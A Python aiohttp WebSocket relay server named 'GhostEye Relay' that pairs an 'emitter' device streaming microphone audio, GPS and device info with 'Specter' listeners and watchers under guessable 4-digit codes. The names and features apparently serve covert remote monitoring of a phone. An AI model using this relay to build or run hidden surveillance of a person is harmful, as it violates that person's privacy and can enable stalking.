import asyncio
import aiohttp
from aiohttp import web
import random
import string
import os

emitters  = {}
listeners = {}
watchers  = {}
last_info = {}

def gen_code():
    while True:
        code = ''.join(random.choices(string.digits, k=4))
        if code not in emitters:
            return code

async def safe_send_str(ws, msg):
    try:
        if not ws.closed:
            await ws.send_str(msg)
            return True
    except Exception:
        pass
    return False

async def safe_send_bytes(ws, data):
    try:
        if not ws.closed:
            await ws.send_bytes(data)
            return True
    except Exception:
        pass
    return False

async def cleanup_code(code, role, ws):
    """Limpieza centralizada — siempre se ejecuta"""
    if role == "EMIT":
        if emitters.get(code) is ws:
            emitters.pop(code, None)
        # Notificar listener
        listener = listeners.get(code)
        if listener and not listener.closed:
            await safe_send_str(listener, "EMITTER_GONE")

    elif role == "JOIN":
        if listeners.get(code) is ws:
            listeners.pop(code, None)
        # Parar micrófono
        emitter = emitters.get(code)
        if emitter and not emitter.closed:
            await safe_send_str(emitter, "STOP")

    elif role == "WATCH":
        if code in watchers:
            watchers[code].discard(ws)

async def handle_ping(request):
    return web.Response(text="GhostEye Relay OK", status=200)

async def self_ping(app):
    url = os.environ.get("RAILWAY_STATIC_URL", os.environ.get("RENDER_EXTERNAL_URL", ""))
    if not url:
        return
    if not url.startswith("http"):
        url = "https://" + url
    while True:
        await asyncio.sleep(4 * 60)
        try:
            async with aiohttp.ClientSession() as session:
                await session.get(url + "/ping", timeout=aiohttp.ClientTimeout(total=10))
        except Exception:
            pass

async def handle(request):
    # ✅ heartbeat=15 — detecta zombies, no tan agresivo
    ws = web.WebSocketResponse(heartbeat=15)
    await ws.prepare(request)
    code = None
    role = None

    try:
        # Timeout inicial para recibir el primer mensaje
        try:
            msg = await asyncio.wait_for(ws.receive(), timeout=15)
        except asyncio.TimeoutError:
            await ws.close()
            return ws

        if msg.type != aiohttp.WSMsgType.TEXT:
            await ws.close()
            return ws

        text = msg.data.strip()

        # ── GHOSTEYE 2 emisor ──
        if text == "EMIT" or text.startswith("EMIT:"):
            if text.startswith("EMIT:"):
                code = text[5:].strip()
                if not code.isdigit() or len(code) != 4:
                    code = gen_code()
            else:
                code = gen_code()

            role = "EMIT"

            # Cerrar emisor anterior si existe
            old = emitters.get(code)
            if old and not old.closed:
                try:
                    await old.close()
                except Exception:
                    pass

            emitters[code] = ws
            if code not in watchers:
                watchers[code] = set()

            await safe_send_str(ws, f"CODE:{code}")

            # ✅ Si Specter ya está esperando — READY inmediato
            listener = listeners.get(code)
            if listener and not listener.closed:
                await safe_send_str(ws, "READY")

            async for msg in ws:
                if msg.type == aiohttp.WSMsgType.BINARY:
                    listener = listeners.get(code)
                    if listener and not listener.closed:
                        ok = await safe_send_bytes(listener, msg.data)
                        if not ok:
                            listeners.pop(code, None)

                elif msg.type == aiohttp.WSMsgType.TEXT:
                    txt = msg.data
                    if txt.startswith("INFO|"):
                        last_info[code] = txt
                        listener = listeners.get(code)
                        if listener and not listener.closed:
                            ok = await safe_send_str(listener, txt)
                            if not ok:
                                listeners.pop(code, None)
                        dead = set()
                        for w in list(watchers.get(code, set())):
                            if w.closed:
                                dead.add(w)
                            else:
                                ok = await safe_send_str(w, txt)
                                if not ok:
                                    dead.add(w)
                        watchers.get(code, set()).difference_update(dead)

                    elif txt.startswith("GPS|") or txt == "GET_INFO":
                        listener = listeners.get(code)
                        if listener and not listener.closed:
                            await safe_send_str(listener, txt)
                        for w in list(watchers.get(code, set())):
                            if not w.closed:
                                await safe_send_str(w, txt)
                    else:
                        listener = listeners.get(code)
                        if listener and not listener.closed:
                            await safe_send_str(listener, txt)

                elif msg.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.ERROR):
                    break

        # ── SPECTER oyente con audio ──
        elif text.startswith("JOIN:"):
            code = text[5:].strip()
            if code not in emitters:
                await safe_send_str(ws, "ERROR:INVALID_CODE")
                await ws.close()
                return ws

            role = "JOIN"

            # Cerrar listener anterior zombie
            old = listeners.get(code)
            if old and not old.closed:
                try:
                    await old.close()
                except Exception:
                    pass

            listeners[code] = ws
            await safe_send_str(ws, "OK")

            # ✅ READY inmediato
            emitter = emitters.get(code)
            if emitter and not emitter.closed:
                await safe_send_str(emitter, "READY")

            # ✅ Último INFO inmediato
            if code in last_info:
                await safe_send_str(ws, last_info[code])

            async for msg in ws:
                if msg.type == aiohttp.WSMsgType.TEXT:
                    emitter = emitters.get(code)
                    if emitter and not emitter.closed:
                        await safe_send_str(emitter, msg.data)
                elif msg.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.ERROR):
                    break

        # ── SPECTER solo info (WATCH) ──
        elif text.startswith("WATCH:"):
            code = text[6:].strip()
            if code not in emitters:
                await safe_send_str(ws, "ERROR:INVALID_CODE")
                await ws.close()
                return ws

            role = "WATCH"
            if code not in watchers:
                watchers[code] = set()
            watchers[code].add(ws)
            await safe_send_str(ws, "WATCHING")

            if code in last_info:
                await safe_send_str(ws, last_info[code])

            emitter = emitters.get(code)
            if emitter and not emitter.closed:
                await safe_send_str(emitter, "GET_INFO")

            async for msg in ws:
                if msg.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.ERROR):
                    break

        else:
            await ws.close()
            return ws

    except Exception as e:
        print(f"Error handle [{role}][{code}]: {e}")
    finally:
        # ✅ Limpieza SIEMPRE — nunca zombie
        if code and role:
            await cleanup_code(code, role, ws)
        if not ws.closed:
            try:
                await ws.close()
            except Exception:
                pass

    return ws

async def main():
    port = int(os.environ.get("PORT", 8765))
    app = web.Application()
    app.router.add_get("/", handle)
    app.router.add_get("/ws", handle)
    app.router.add_get("/ping", handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    print(f"Relay PRO v2 corriendo en puerto {port}")
    asyncio.ensure_future(self_ping(app))
    await asyncio.Future()

asyncio.run(main())
